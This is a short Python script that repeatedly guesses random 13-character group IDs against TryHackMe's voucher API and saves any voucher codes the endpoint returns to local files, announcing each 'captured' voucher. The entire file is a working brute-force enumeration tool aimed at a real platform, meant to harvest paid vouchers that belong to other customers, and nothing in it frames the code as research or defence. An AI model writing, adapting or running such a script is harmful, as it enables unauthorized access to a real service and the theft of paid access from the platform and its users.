import requests
import random
import string
import json
import time

def generate_random_string(length=13):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def check_voucher():
    random_string = generate_random_string()
    print(f"Trying voucher {random_string}...")
    url = f"https://tryhackme.com/api/v2/vouchers?groupId={random_string}"

    response = requests.get(url)

    if response.status_code == 200:
        response_json = response.json()
        if response_json.get("status") == "success":
            data = response_json.get("data", {})
            purchased_voucher_count = data.get("purchasedVoucherCount")
            voucher_validity = data.get("voucherValidityInMonths")
            unredeemed_voucher_count = data.get("unredeemedVoucherCount")
            vouchers = data.get("vouchers", [])

            voucher_data = {
                "purchasedVoucherCount": purchased_voucher_count,
                "voucherValidityInMonths": voucher_validity,
                "unredeemedVoucherCount": unredeemed_voucher_count,
                "vouchers": vouchers
            }

            voucher_code = vouchers[0]["code"] if vouchers else "N/A"

            filename = f"THM_voucher_{random_string}.txt"
            with open(filename, 'w') as file:
                json.dump(voucher_data, file, indent=4)

            print(f"💖 We captured a THM voucher. \"code\": \"{voucher_code}\" and saved it in {filename}")
            return True
        else:
            print(f"Checked {random_string} voucher, it is invalid.")
    else:
        print(f"Failed to connect. Status code: {response.status_code}")

    return False

if __name__ == "__main__":
    try:
        while True:
            if check_voucher():
                break
            # Adding a delay between requests
            time.sleep(5)
    except KeyboardInterrupt:
        print("\nProcess interrupted by user. Exiting...")
